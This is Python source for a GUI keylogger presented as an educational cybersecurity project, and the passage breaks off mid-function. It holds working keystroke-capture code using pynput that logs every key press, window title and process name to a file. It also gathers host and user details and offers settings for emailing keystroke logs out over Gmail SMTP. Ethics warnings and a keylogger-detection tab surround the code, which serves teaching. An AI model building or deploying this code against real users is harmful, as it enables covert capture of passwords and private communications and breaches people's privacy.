"""
Educational Keylogger PoC - GUI Version
Project 4 - Cybersecurity Python Roadmap
Author: bnahmedsoumaya00
Date: January 1, 2026

╔═══════════════════════════════════════════════════════════════╗
║                  ⚠️  ETHICAL WARNING ⚠️                        ║
║  This tool is for EDUCATIONAL PURPOSES ONLY                   ║
║  Use ONLY on your own devices for learning                    ║
║  Unauthorized use is ILLEGAL and UNETHICAL                    ║
╚═══════════════════════════════════════════════════════════════╝
"""

import os
import sys
import socket
import platform
import logging
import smtplib
import getpass
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from threading import Thread
import json
from tkinter import *
from tkinter import ttk, messagebox, scrolledtext, filedialog
from tkinter.font import Font

# Third-party imports
try:
    from pynput import keyboard
    from pynput.keyboard import Key, Listener
except ImportError:
    print("[!] Error: pynput not installed. Run: pip install pynput")
    sys.exit(1)

try:
    import win32gui
    import win32process
    import psutil
    WIN32_AVAILABLE = True
except ImportError:
    WIN32_AVAILABLE = False


# ============================================================================
# CONFIGURATION
# ============================================================================

class Config:
    """Configuration settings"""
    LOG_FILE = "keylog.txt"
    SYSTEM_INFO_FILE = "system_info.json"
    
    # Email settings (disabled by default)
    EMAIL_ENABLED = False
    SENDER_EMAIL = ""
    SENDER_PASSWORD = ""
    RECEIVER_EMAIL = ""
    SMTP_SERVER = "smtp.gmail.com"
    SMTP_PORT = 587
    
    # Educational mode
    EDUCATIONAL_MODE = True
    SHOW_KEYSTROKES = True


# ============================================================================
# SYSTEM INFORMATION
# ============================================================================

class SystemInfo:
    """System information gathering"""
    
    @staticmethod
    def get_system_info():
        """Collect system information"""
        try:
            info = {
                'timestamp': datetime.now().isoformat(),
                'hostname': socket.gethostname(),
                'username': getpass.getuser(),
                'platform': platform.system(),
                'platform_release': platform.release(),
                'platform_version': platform.version(),
                'architecture': platform.machine(),
                'processor': platform.processor(),
                'private_ip': SystemInfo.get_private_ip(),
            }
            return info
        except Exception as e:
            return {'error': str(e)}
    
    @staticmethod
    def get_private_ip():
        """Get local IP"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "Unable to get IP"
    
    @staticmethod
    def get_active_window():
        """Get active window title"""
        if not WIN32_AVAILABLE:
            return "Unknown Window"
        try:
            window = win32gui.GetForegroundWindow()
            return win32gui.GetWindowText(window)
        except:
            return "Unknown Window"
    
    @staticmethod
    def get_active_process():
        """Get active process name"""
        if not WIN32_AVAILABLE:
            return "Unknown Process"
        try:
            window = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(window)
            process = psutil.Process(pid)
            return process.name()
        except:
            return "Unknown Process"


# ============================================================================
# KEYLOGGER ENGINE
# ============================================================================

class KeyloggerEngine:
    """Keylogger backend engine"""
    
    def __init__(self, callback=None):
        self.log = ""
        self.current_window = ""
        self.start_time = datetime.now()
        self.callback = callback
        self.running = False
        self.listener = None
        
        # Setup logging
        logging.basicConfig(
            filename=Config.LOG_FILE,
            level=logging.INFO,
            format='%(asctime)s - %(message)s'
        )
        
        # Save system info
        self.system_info = SystemInfo.get_system_info()
        self.save_system_info()
        self.log_system_info()
    
    def save_system_info(self):
        """Save system info to file"""
        with open(Config.SYSTEM_INFO_FILE, 'w') as f:
            json.dump(self.system_info, f, indent=4)
    
    def log_system_info(self):
        """Log initial system info"""
        info_text = f"""
System Information:
-------------------
Hostname: {self.system_info.get('hostname', 'N/A')}
Username: {self.system_info.get('username', 'N/A')}
Platform: {self.system_info.get('platform', 'N/A')} {self.system_info.get('platform_release', 'N/A')}
Private IP: {self.system_info.get('private_ip', 'N/A')}
Start Time: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}
"""
        logging.info("="*70)
        logging.info("EDUCATIONAL KEYLOGGER SESSION STARTED")
        logging.info("="*70)
        logging.info(info_text)
        self.log += info_text + "\n"
    
    def log_window_change(self):
        """Log window changes"""
        new_window = SystemInfo.get_active_window()
        
        if new_window != self.current_window and new_window != "Unknown Window":
            self.current_window = new_window
            process = SystemInfo.get_active_process()
            
            window_log = f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Window: {new_window} | Process: {process}\n"
            
            logging.info(window_log)
            self.log += window_log
            
            if self.callback:
                self.callback(f"\n{'='*60}\n{window_log}{'='*60}\n")
    
    def on_press(self, key):
        """Handle key press"""
        try:
            self.log_window_change()
            
            # Format key
            if hasattr(key, 'char') and key.char is not None:
                key_str = key.char
            else:
                key_str = f'[{str(key).replace("Key.", "")}]'
            
            # Log to file
            logging.info(key_str)
            self.log += key_str
            
            # Callback to GUI
            if self.callback:
                self.callback(key_str)
            
        except Exception as e:
            logging.error(f"Error: {e}")
    
    def on_release(self, key):
        """Handle key release"""
        if key == Key.esc:
            return False
    
    def start(self):
        """Start keylogger"""
        self.running = True
        self.listener = Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()
    
    def stop(self):
        """Stop keylogger"""
        self.running = False
        if self.listener:
            self.listener.stop()
        
        logging.info("\n" + "="*70)
        logging.info("EDUCATIONAL KEYLOGGER SESSION ENDED")
        logging.info(f"Duration: {datetime.now() - self.start_time}")
        logging.info("="*70)
    
    def get_log(self):
        """Get current log"""
        return self.log


# ============================================================================
# GUI APPLICATION
# ============================================================================

class KeyloggerGUI:
    """GUI Application for Educational Keylogger"""
    
    def __init__(self, root):
        self.root = root
        self.root.title("Educational Keylogger - Security Research Tool")
        self.root.geometry("1000x750")
        self.root.resizable(False, False)
        
        # Variables
        self.keylogger = None
        self.running = False
        self.email_enabled = BooleanVar(value=False)
        self.sender_email = StringVar()
        self.sender_password = StringVar()
        self.receiver_email = StringVar()
        
        # Show warning first
        self.show_initial_warning()
        
        # Create notebook (tabs)
        self.notebook = ttk.Notebook(root)
        self.notebook.pack(fill=BOTH, expand=True, padx=10, pady=10)
        
        # Create tabs
        self.keylogger_frame = Frame(self.notebook, bg='white')
        self.settings_frame = Frame(self.notebook, bg='white')
        self.detection_frame = Frame(self.notebook, bg='white')
        self.ethics_frame = Frame(self.notebook, bg='white')
        
        self.notebook.add(self.keylogger_frame, text="  Keylogger  ")
        self.notebook.add(self.settings_frame, text="  Settings  ")
        self.notebook.add(self.detection_frame, text="  Detection Methods  ")
        self.notebook.add(self.ethics_frame, text="  Ethics & Legal  ")
        
        # Setup tabs
        self.setup_keylogger_tab()
        self.setup_settings_tab()
        self.setup_detection_tab()
        self.setup_ethics_tab()
        
        # Status bar
        self.status_label = Label(root, text="Ready - Educational Mode", 
                                 bg='#ecf0f1', anchor=W, padx=10, pady=5,
                                 font=("Arial", 9))
        self.status_label.pack(fill=X, side=BOTTOM)
    
    def show_initial_warning(self):
        """Show initial ethical warning with enhanced style and writing"""
        warning_window = Toplevel(self.root)
        warning_window.title("⚠️ LEGAL WARNING - READ CAREFULLY")
        warning_window.geometry("700x600")
        warning_window.resizable(False, False)
        warning_window.configure(bg='#f8f9fa')
        warning_window.grab_set()  # Make modal
        warning_window.attributes("-topmost", True)  # Ensure always on top

        # Center the window
        warning_window.update_idletasks()
        x = (warning_window.winfo_screenwidth() // 2) - (350)
        y = (warning_window.winfo_screenheight() // 2) - (300)
        warning_window.geometry(f'700x600+{x}+{y}')

        # Title frame
        title_frame = Frame(warning_window, bg='#dc3545', height=100)
        title_frame.pack(fill=X)
        title_frame.pack_propagate(False)

        Label(title_frame, text="⚠️", font=("Arial", 32), bg='#dc3545', fg='white').pack(pady=5)
        Label(title_frame, text="CRITICAL LEGAL WARNING", font=("Arial", 14, "bold"), bg='#dc3545', fg='white').pack()

        # Content frame
        content_frame = Frame(warning_window, bg='#f8f9fa')
        content_frame.pack(fill=BOTH, expand=True, padx=30, pady=20)

        # Warning text
        warning_text = scrolledtext.ScrolledText(
            content_frame,
            height=20,
            width=75,
            font=("Arial", 10),
            wrap=WORD,
            relief=FLAT,
            bg='#fff3cd',
            padx=15,
            pady=15
        )
        warning_text.pack(fill=BOTH, expand=True)

        warning_content = """This tool is for EDUCATIONAL PURPOSES ONLY.\n\nUnauthorized use is ILLEGAL and UNETHICAL.\n\nBy proceeding, you agree to use this tool responsibly and only on your own devices."""
        warning_text.insert(1.0, warning_content)
        warning_text.config(state=DISABLED)

        # Checkbox
        accept_var = BooleanVar(value=False)

        check_frame = Frame(content_frame, bg='#f8f9fa')
        check_frame.pack(pady=10)

        Checkbutton(check_frame, 
                   text="I have read and understand the legal warnings above",
                   variable=accept_var,
                   bg='#f8f9fa',
                   font=("Arial", 10, "bold"),
                   fg='#dc3545').pack()

        # Buttons
        btn_frame = Frame(warning_window, bg='#f8f9fa')
        btn_frame.pack(pady=20)

        def on_accept():
            if accept_var.get():
                warning_window.destroy()
            else:
                messagebox.showerror(
                    "Agreement Required",
                    "You must check the box to confirm you understand\n"
                    "the legal warnings before proceeding.",
                    parent=warning_window
                )

        def on_decline():
            warning_window.destroy()
            messagebox.showinfo(
                "Thank You",
                "Smart choice!\n\n"
                "Only use security tools on your own devices\n"
                "with full understanding of the legal implications.\n\n"
                "Exiting for your safety."
            )
            self.root.destroy()
            sys.exit(0)

        # Handle closing via 'X' button
        def on_close():
            on_decline()

        warning_window.protocol("WM_DELETE_WINDOW", on_close)

        Button(btn_frame, text="✅ I Accept - I Will Use This Legally",
               command=on_accept,
               bg='#28a745', fg='white',
               font=("Arial", 11, "bold"),
               padx=30, pady=12,
               relief=FLAT, cursor='hand2').pack(side=LEFT, padx=10)

        Button(btn_frame, text="❌ I Decline - Exit Program",
               command=on_decline,
               bg='#6c757d', fg='white',
               font=("Arial", 11, "bold"),
               padx=30, pady=12,
               relief=FLAT, cursor='hand2').pack(side=LEFT, padx=10)

        # Wait for window to close
        self.root.wait_window(warning_window)
    
    def setup_keylogger_tab(self):
        """Setup main keylogger interface"""
        # Title
        title = Label(self.keylogger_frame, 
                     text="👁️ Educational Keylogger",
                     font=("Arial", 16, "bold"), 
                     bg='white', fg='#2c3e50')
        title.pack(pady=20)
        
        # Warning label
        warning = Label(self.keylogger_frame,
                       text="⚠️  For Educational Use ONLY - Test on YOUR devices",
                       font=("Arial", 10, "bold"),
                       bg='#fff3cd', fg='#856404',
                       pady=10)
        warning.pack(fill=X, padx=20)
        
        # Control buttons
        btn_frame = Frame(self.keylogger_frame, bg='white')
        btn_frame.pack(pady=20)
        
        self.start_btn = Button(btn_frame,
                                text="🚀 Start Keylogger",
                                command=self.start_keylogger,
                                bg='#28a745', fg='white',
                                font=("Arial", 12, "bold"),
                                padx=40, pady=12,
                                relief=FLAT, cursor='hand2')
        self.start_btn.grid(row=0, column=0, padx=10)
        
        self.stop_btn = Button(btn_frame,
                               text="⏹ Stop Keylogger",
                               command=self.stop_keylogger,
                               bg='#dc3545', fg='white',
                               font=("Arial", 12, "bold"),
                               padx=40, pady=12,
                               relief=FLAT, cursor='hand2',
                               state=DISABLED)
        self.stop_btn.grid(row=0, column=1, padx=10)
        
        clear_btn = Button(btn_frame,
                          text="🗑️ Clear Log",
                          command=self.clear_log,
                          bg='#6c757d', fg='white',
                          font=("Arial", 12, "bold"),
                          padx=40, pady=12,
                          relief=FLAT, cursor='hand2')
        clear_btn.grid(row=0, column=2, padx=10)
        
        # System info display
        info_frame = LabelFrame(self.keylogger_frame,
                               text="  System Information  ",
                               font=("Arial", 11, "bold"),
                               bg='white', padx=20, pady=15)
        info_frame.pack(padx=20, pady=10, fill=X)
        
        # Get system info
        sys_info = SystemInfo.get_system_info()
        
        info_text = f"""
Hostname: {sys_info.get('hostname', 'N/A')}    |    Username: {sys_info.get('username', 'N/A')}
Platform: {sys_info.get('platform', 'N/A')} {sys_info.get('platform_release', 'N/A')}    |    IP: {sys_info.get('private_ip', 'N/A')}
Architecture: {sys_info.get('architecture', 'N/A')}    |    Processor: {sys_info.get('processor', 'N/A')[:50]}...
        """
        
        info_label = Label(info_frame, text=info_text,
                          font=("Courier", 9), bg='white',
                          justify=LEFT)
        info_label.pack(anchor=W)
        
        # Log display
        log_label = Label(self.keylogger_frame,
                         text="Keystroke Log:",
                         font=("Arial", 11, "bold"),
                         bg='white', anchor=W)
        log_label.pack(fill=X, padx=20, pady=(10, 5))
        
        log_frame = Frame(self.keylogger_frame, bg='white')
        log_frame.pack(fill=BOTH, expand=True, padx=20, pady=10)
        
        self.log_text = scrolledtext.ScrolledText(
            log_frame,
            height=15,
            width=110,
            font=("Courier", 9),
            wrap=WORD,
            relief=SOLID,
            borderwidth=1,
            padx=10,
            pady=10,
            bg='#f8f9fa'
        )
        self.log_text.pack(fill=BOTH, expand=True)
        
        # Initial message
        welcome = """
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║          Educational Keylogger - Security Research Tool          ║
║                                                                  ║
║  Ready to start logging for educational purposes.                ║
║                                                                  ║
║  Click "Start Keylogger" to begin monitoring YOUR device.        ║
║  All keystrokes will be logged to: keylog.txt                    ║
║                                                                  ║
║  ⚠️  Remember: Use ONLY on your own devices!                     ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
        """
        self.log_text.insert(1.0, welcome)
        self.log_text.config(state=DISABLED)
    
    def setup_settings_tab(self):
        """Setup settings interface"""
        title = Label(self.settings_frame,
                     text="⚙️ Settings",
                     font=("Arial", 16, "bold"),
                     bg='white', fg='#2c3e50')
        title.pack(pady=20)
        
        # Email settings
        email_frame = LabelFrame(self.settings_frame,
                                text="  Email Reporting (Optional)  ",
                                font=("Arial", 11, "bold"),
                                bg='white', padx=20, pady=15)
        email_frame.pack(padx=40, pady=20, fill=X)
        
        Checkbutton(email_frame,
                   text="Enable Email Reporting",
                   variable=self.email_enabled,
                   bg='white',
                   font=("Arial", 10)).grid(row=0, column=0, columnspan=2, sticky=W, pady=5)
        
        Label(email_frame, text="Sender Email:",
              font=("Arial", 10), bg='white').grid(row=1, column=0, sticky=W, pady=5)
        Entry(email_frame, textvariable=self.sender_email,
              width=40, font=("Arial", 9)).grid(row=1, column=1, padx=10, pady=5)
        
        Label(email_frame, text="App Password:",
              font=("Arial", 10), bg='white').grid(row=2, column=0, sticky=W, pady=5)
        Entry(email_frame, textvariable=self.sender_password,
              width=40, font=("Arial", 9), show='*').grid(row=2, column=1, padx=10, pady=5)
        
        Label(email_frame, text="Receiver Email:",
              font=("Arial", 10), bg='white').grid(row=3, column=0, sticky=W, pady=5)
        Entry(email_frame, textvariable=self.receiver_email,
              width=40, font=("Arial", 9)).grid(row=3, column=1, padx=10, pady=5)
        
        Button(email_frame, text="💾 Save Email Settings",
               command=self.save_email_settings,
               bg='#007bff', fg='white',
               font=("Arial", 10, "bold"),
               padx=20, pady=8,
               relief=FLAT, cursor='hand2').grid(row=4, column=0, columnspan=2, pady=15)
        
        # Info
        info_text = """
📧 Email Reporting Info:
   • Requires Gmail App Password (not regular password)
   • Enable 2FA on Gmail first
   • Generate App Password in Google Account Security
   • Emails contain keystroke logs (use responsibly!)
   
⚠️  Security Note:
   Email exfiltration is a key indicator of keylogger activity!
   This is for educational demonstration only.
        """
        
        Label(email_frame, text=info_text,
              font=("Arial", 9), bg='white',
              fg='#6c757d', justify=LEFT).grid(row=5, column=0, columnspan=2, sticky=W)
        
        # File locations
        file_frame = LabelFrame(self.settings_frame,
                               text="  Log Files  ",
                               font=("Arial", 11, "bold"),
                               bg='white', padx=20, pady=15)
        file_frame.pack(padx=40, pady=20, fill=X)
        
        files_text = f"""
Keystroke Log: {os.path.abspath(Config.LOG_FILE)}
System Info: {os.path.abspath(Config.SYSTEM_INFO_FILE)}

These files are created in the same directory as this program.
        """
        
        Label(file_frame, text=files_text,
              font=("Courier", 9), bg='white',
              justify=LEFT).pack(anchor=W)
        
        Button(file_frame, text="📂 Open Log Folder",
               command=self.open_log_folder,
               bg='#17a2b8', fg='white',
               font=("Arial", 10, "bold"),
               padx=20, pady=8,
               relief=FLAT, cursor='hand2').pack(pady=10)
    
    def setup_detection_tab(self):
        """Setup detection methods tab"""
        title = Label(self.detection_frame,
                     text="🔍 Detection Methods",
                     font=("Arial", 16, "bold"),
                     bg='white', fg='#2c3e50')
        title.pack(pady=20)
        
        desc = Label(self.detection_frame,
                    text="Learn how to detect and protect against keyloggers",
                    font=("Arial", 10), bg='white', fg='#7f8c8d')
        desc.pack(pady=5)
        
        detection_scroll = scrolledtext.ScrolledText(
            self.detection_frame,
            height=28,
            width=110,
            font=("Courier", 9),
            wrap=WORD,
            bg='white',
            padx=15,
            pady=15
        )
        detection_scroll.pack(fill=BOTH, expand=True, padx=20, pady=10)
        
        detection_text = """
╔═══════════════════════════════════════════════════════════════╗
║              HOW TO DETECT KEYLOGGERS                         ║
╚═══════════════════════════════════════════════════════════════╝

1. PROCESS MONITORING 🔎
   Windows:
   • Open Task Manager (Ctrl+Shift+Esc)
   • Look for suspicious Python processes
   • Check process names and memory usage
   
   Command: tasklist | findstr python
   
   What to look for:
   • Unknown Python scripts
   • High memory usage
   • Suspicious process names

────────────────────────────────────────────────────────────────

2. NETWORK MONITORING 🌐
   Commands:
   • netstat -ano (show all connections)
   • netstat -b (show process names)
   
   What to look for:
   • Outbound SMTP connections (port 587, 465, 25)
   • Unknown connections to external IPs
   • Data exfiltration patterns

────────────────────────────────────────────────────────────────

3. FILE SYSTEM MONITORING 📁
   Look for:
   • Recent .txt or .log files
   • Files with names like "keylog", "keys", "log"
   • Hidden files (show hidden files in Explorer)
   
   Command: dir /s /b *.txt | findstr log

────────────────────────────────────────────────────────────────

4. STARTUP PROGRAMS 🚀
   Check these locations:
   • Task Manager → Startup tab
   • msconfig → Startup
   • Registry: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
   
   Tools:
   • Autoruns (Sysinternals)
   • Task Scheduler

────────────────────────────────────────────────────────────────

5. ANTI-VIRUS SCANNING 🛡️
   Actions:
   • Run full system scan
   • Update virus definitions
   • Use multiple AV engines
   • Check heuristic detection
   
   Free Tools:
   • Windows Defender
   • Malwarebytes
   • Hitman Pro

────────────────────────────────────────────────────────────────

6. BEHAVIORAL INDICATORS ⚠️
   Signs of infection:
   • Keyboard lag
   • Missed keystrokes
   • Slow system performance
   • High CPU usage when idle
   • Unusual network activity
   • Antivirus alerts

────────────────────────────────────────────────────────────────

7. PREVENTION MEASURES 🔐
   Best Practices:
   ✅ Keep OS and software updated
   ✅ Use reputable antivirus
   ✅ Enable Windows Defender
   ✅ Use firewall
   ✅ Be cautious with downloads
   ✅ Enable UAC (User Account Control)
   ✅ Regular system scans
   ✅ Use virtual keyboard for passwords

────────────────────────────────────────────────────────────────

8. DETECTION TOOLS 🔧
   Recommended:
   • Process Monitor (Sysinternals)
   • Process Explorer (Sysinternals)
   • Autoruns (Sysinternals)
   • TCPView (network connections)
   • Wireshark (packet analysis)
   • Glasswire (firewall & monitoring)

────────────────────────────────────────────────────────────────

9. THIS EDUCATIONAL TOOL 📚
   How to detect THIS specific keylogger:
   
   ✅ Visible process name: "python.exe" or "educational_keylogger.py"
   ✅ Creates obvious log files: keylog.txt, system_info.json
   ✅ No stealth features (intentionally detectable)
   ✅ Shows in Task Manager
   ✅ No rootkit capabilities
   ✅ Easy to stop (close program or end process)
   
   This tool is DESIGNED to be easily detected for educational purposes!

────────────────────────────────────────────────────────────────

10. IMMEDIATE ACTIONS IF INFECTED 🚨
    Steps to take:
    1. Disconnect from internet
    2. Run antivirus scan
    3. Check Task Manager for suspicious processes
    4. Review recent file changes
    5. Check startup programs
    6. Change all passwords (from clean device)
    7. Enable 2FA on all accounts
    8. Consider system restore or clean install

════════════════════════════════════════════════════════════════

📖 Remember: Understanding threats helps you protect against them!
        """
        
        detection_scroll.insert(1.0, detection_text)
        detection_scroll.config(state=DISABLED)
    
    def setup_ethics_tab(self):
        """Setup ethics and legal tab"""
        title = Label(self.ethics_frame,
                     text="⚖️ Ethics & Legal",
                     font=("Arial", 16, "bold"),
                     bg='white', fg='#2c3e50')
        title.pack(pady=20)
        
        ethics_scroll = scrolledtext.ScrolledText(
            self.ethics_frame,
            height=28,
            width=110,
            font=("Courier", 9),
            wrap=WORD,
            bg='white',
            padx=15,
            pady=15
        )
        ethics_scroll.pack(fill=BOTH, expand=True, padx=20, pady=10)
        
        ethics_text = """
╔═══════════════════════════════════════════════════════════════╗
║              ETHICAL GUIDELINES & LEGAL FRAMEWORK             ║
╚═══════════════════════════════════════════════════════════════╝

⚖️  LEGAL USE CASES:

✅ Testing on YOUR OWN devices
✅ Educational cybersecurity research  
✅ Security awareness demonstrations
✅ Authorized penetration testing (with written permission)
✅ Academic research in controlled environments

────────────────────────────────────────────────────────────────

❌ ILLEGAL USE CASES:

❌ Installing on devices you don't own
❌ Monitoring others without explicit consent
❌ Stealing passwords or private information
❌ Spying on family, friends, or coworkers
❌ Corporate espionage
❌ Any unauthorized surveillance
❌ Bypassing access controls

────────────────────────────────────────────────────────────────

📜 LEGAL FRAMEWORKS:

UNITED STATES - Computer Fraud and Abuse Act (CFAA):
• Makes unauthorized access illegal
• Installing keyloggers without permission is a federal crime
• Penalties: Up to 20 years imprisonment
• Civil liability for damages

EUROPEAN UNION - GDPR:
• Requires explicit consent for data collection
• Keystroke logging violates privacy rights
• Penalties: Up to €20 million or 4% of annual revenue
• Right to be forgotten

UNITED KINGDOM - Computer Misuse Act:
• Unauthorized access is criminal
• Creating/distributing malware is illegal
• Penalties: Up to 10 years imprisonment

────────────────────────────────────────────────────────────────

🛡️  ETHICAL PRINCIPLES:

1. TRANSPARENCY
   • Be open about your research
   • Document your intentions
   • Disclose capabilities honestly

2. CONSENT
   • Always get explicit permission
   • Use only on your own devices
   • Respect others' privacy

3. MINIMIZE HARM
   • Don't cause damage
   • Protect sensitive data
   • Consider the impact

4. RESPONSIBILITY
   • Be accountable for your actions
   • Accept consequences
   • Use knowledge for good

5. EDUCATION
   • Share knowledge responsibly
   • Teach defensive security
   • Help make systems more secure

────────────────────────────────────────────────────────────────

📋 RESPONSIBLE DISCLOSURE:

If you discover a vulnerability:

1. DOCUMENT
   • Record details
   • Steps to reproduce
   • Potential impact

2. REPORT
   • Contact the vendor/organization
   • Use responsible disclosure channels
   • Provide clear information

3. WAIT
   • Allow 90 days for patching
   • Don't publicly disclose immediately
   • Work with security teams

4. COORDINATE
   • Follow disclosure policies
   • Communicate with stakeholders
   • Consider user safety

5. PUBLISH
   • Only after patch is released
   • Give credit appropriately
   • Help others learn

Resources:
• HackerOne: https://hackerone.com
• Bugcrowd: https://bugcrowd.com
• CERT/CC: https://www.kb.cert.org/vuls/report/

────────────────────────────────────────────────────────────────

⚠️  CONSEQUENCES OF MISUSE:

CRIMINAL:
• Federal/state criminal charges
• Prison sentences (up to 20 years)
• Permanent criminal record
• Felony convictions

CIVIL:
• Lawsuits for privacy violations
• Financial penalties
• Damages to victims
• Legal fees

PROFESSIONAL:
• Loss of employment
• Banned from industry
• Damaged reputation
• Loss of certifications

PERSONAL:
• Broken trust
• Damaged relationships
• Social consequences
• Guilt and regret

────────────────────────────────────────────────────────────────

💡 USE YOUR SKILLS FOR GOOD:

POSITIVE APPLICATIONS:
✅ Helping organizations improve security
✅ Teaching others about threats
✅ Developing defensive tools
✅ Contributing to open-source security
✅ Responsible vulnerability research
✅ Security awareness training
✅ Protecting users and systems

────────────────────────────────────────────────────────────────

📚 EDUCATIONAL RESOURCES:

Organizations:
• SANS Institute
• OWASP Foundation
• (ISC)² - Certified Information Systems Security Professional
• EC-Council - Certified Ethical Hacker
• NIST Cybersecurity Framework

Certifications:
• CEH (Certified Ethical Hacker)
• OSCP (Offensive Security Certified Professional)
• Security+ (CompTIA)
• CISSP (Certified Information Systems Security Professional)

Practice Platforms:
• TryHackMe (beginner-friendly)
• Hack The Box (intermediate)
• PentesterLab (web security)
• OverTheWire (Linux challenges)

════════════════════════════════════════════════════════════════

🎓 REMEMBER:

"With great power comes great responsibility"

Your cybersecurity skills can be used to:
• PROTECT people and systems
• EDUCATE others about threats
• BUILD defensive tools
• IMPROVE security for everyone

OR they can be misused to:
• HARM innocent people
• VIOLATE privacy
• STEAL information
• BREAK the law

The choice is yours. Choose wisely. 🛡️

════════════════════════════════════════════════════════════════

By using this educational tool, you commit to:
✅ Using it legally and ethically
✅ Only on your own devices
✅ For learning defensive security
✅ Helping make the internet safer

Stay Ethical. Stay Legal. Stay Secure. 🔒
        """
        
        ethics_scroll.insert(1.0, ethics_text)
        ethics_scroll.config(state=DISABLED)
    
    def start_keylogger(self):
        """Start the keylogger"""
        try:
            # Clear log
            self.log_text.config(state=NORMAL)
            self.log_text.delete(1.0, END)
            
            # Create keylogger with callback
            self.keylogger = KeyloggerEngine(callback=self.append_to_log)
            
            # Start in separate thread
            thread = Thread(target=self.keylogger.start, daemon=True)
            thread.start()
            
            self.running = True
            
            # Update UI
            self.start_btn.config(state=DISABLED)
            self.stop_btn.config(state=NORMAL)
            self.update_status("🔴 LOGGING ACTIVE - All keystrokes being recorded!")
            
            # Show started message
            self.append_to_log("""
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║            KEYLOGGER STARTED - EDUCATIONAL MODE                  ║
║                                                                  ║
║  All keystrokes are being logged to: keylog.txt                  ║
║                                                                  ║
║  Click "Stop Keylogger" to end logging                           ║
║  Press ESC key to stop                                           ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝

""")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start keylogger:\n{e}")
            self.update_status("Error starting keylogger")
    
    def stop_keylogger(self):
        """Stop the keylogger"""
        if self.keylogger:
            self.keylogger.stop()
            self.running = False
            
            # Update UI
            self.start_btn.config(state=NORMAL)
            self.stop_btn.config(state=DISABLED)
            self.update_status("✅ Logging stopped - Session ended")
            
            # Show stopped message
            self.append_to_log("\n\n" + "="*70 + "\n")
            self.append_to_log("KEYLOGGER STOPPED\n")
            self.append_to_log(f"Log saved to: {os.path.abspath(Config.LOG_FILE)}\n")
            self.append_to_log("="*70 + "\n")
            
            # Create custom success dialog
            success_window = Toplevel(self.root)
            success_window.title("✅ Stopped Successfully")
            success_window.geometry("500x300")
            success_window.resizable(False, False)
            success_window.configure(bg='white')
            success_window.grab_set()
            
            # Center
            success_window.update_idletasks()
            x = (success_window.winfo_screenwidth() // 2) - (250)
            y = (success_window.winfo_screenheight() // 2) - (150)
            success_window.geometry(f'500x300+{x}+{y}')
            
            # Title
            title_frame = Frame(success_window, bg='#28a745', height=70)
            title_frame.pack(fill=X)
            title_frame.pack_propagate(False)
            
            Label(title_frame, text="✅", font=("Arial", 28),
                  bg='#28a745', fg='white').pack(pady=5)
            Label(title_frame, text="Keylogger Stopped Successfully",
                  font=("Arial", 12, "bold"), bg='#28a745', fg='white').pack()
            
            # Content
            content_frame = Frame(success_window, bg='white')
            content_frame.pack(fill=BOTH, expand=True, padx=30, pady=20)
            
            Label(content_frame,
                  text="Session ended. Logs have been saved.",
                  font=("Arial", 11),
                  bg='white').pack(pady=10)
            
            # File info
            info_frame = LabelFrame(content_frame,
                                   text="  Saved Files  ",
                                   font=("Arial", 10, "bold"),
                                   bg='#f8f9fa',
                                   padx=15, pady=10)
            info_frame.pack(pady=10, fill=X)
            
            Label(info_frame,
                  text=f"📄 Keylog: {os.path.basename(Config.LOG_FILE)}",
                  font=("Courier", 9),
                  bg='#f9f9fa',
                  anchor=W).pack(anchor=W, pady=3)
            
            Label(info_frame,
                  text=f"📄 System Info: {os.path.basename(Config.SYSTEM_INFO_FILE)}",
                  font=("Courier", 9),
                  bg='#f9f9fa',
                  anchor=W).pack(anchor=W, pady=3)
            
            Label(info_frame,
                  text=f"📁 Location: {os.path.dirname(os.path.abspath(Config.LOG_FILE))}",
                  font=("Courier", 8),
                  bg='#f9f9fa',
                  fg='#6c757d',
                  anchor=W).pack(anchor=W, pady=3)
            
            # Button
            Button(success_window, text="OK",
                   command=success_window.destroy,
                   bg='#007bff', fg='white',
                   font=("Arial", 11, "bold"),
                   padx=40, pady=10,
                   relief=FLAT, cursor='hand2').pack(pady=15)
    
    def clear_log(self):
        """Clear the log display"""
        # Create custom confirmation
        confirm_window = Toplevel(self.root)
        confirm_window.title("Clear Log Display")
        confirm_window.geometry("450x250")
        confirm_window.resizable(False, False)
        confirm_window.configure(bg='white')
        confirm_window.grab_set()
        
        # Center
        confirm_window.update_idletasks()
        x = (confirm_window.winfo_screenwidth() // 2) - (225)
        y = (confirm_window.winfo_screenheight() // 2) - (125)
        confirm_window.geometry(f'450x250+{x}+{y}')
        
        # Title
        title_frame = Frame(confirm_window, bg='#17a2b8', height=60)
        title_frame.pack(fill=X)
        title_frame.pack_propagate(False)
        
        Label(title_frame, text="🗑️", font=("Arial", 24),
              bg='#17a2b8', fg='white').pack(pady=5)
        Label(title_frame, text="Clear Log Display?",
              font=("Arial", 12, "bold"), bg='#17a2b8', fg='white').pack()
        
        # Content
        content_frame = Frame(confirm_window, bg='white')
        content_frame.pack(fill=BOTH, expand=True, padx=30, pady=20)
        
        Label(content_frame,
              text="This will clear the log display.",
              font=("Arial", 11),
              bg='white').pack(pady=5)
        
        Label(content_frame,
              text="(This only clears the display, not the saved file)",
              font=("Arial", 9),
              bg='white', fg='#6c757d').pack(pady=5)
        
        Label(content_frame,
              text=f"The keylog.txt file will remain unchanged.",
              font=("Arial", 9),
              bg='white', fg='#6c757d').pack(pady=10)
        
        result = {'confirmed': False}
        
        def on_yes():
            result['confirmed'] = True
            confirm_window.destroy()
        
        def on_no():
            result['confirmed'] = False
            confirm_window.destroy()
        
        # Buttons
        btn_frame = Frame(confirm_window, bg='white')
        btn_frame.pack(pady=15)
        
        Button(btn_frame, text="Clear Display",
               command=on_yes,
               bg='#17a2b8', fg='white',
               font=("Arial", 10, "bold"),
               padx=25, pady=8,
